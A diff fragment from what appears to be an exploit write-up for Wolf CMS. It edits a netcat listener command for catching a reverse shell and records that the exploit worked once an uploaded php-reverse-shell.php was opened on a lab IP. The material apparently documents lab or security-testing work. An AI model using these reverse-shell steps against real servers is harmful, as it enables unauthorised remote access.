@@ -229,7 +229,7 @@ When upload file had been completed. The file will be stored in /wolfcms/public/
 
 To listening reverse shell
 ```
-nc -v -n -l -p 1234
+nc -nvlp 8888
 ```
 
 Successful exploit when I clicked on http://192.168.159.131/wolfcms/public/php-reverse-shell.php.
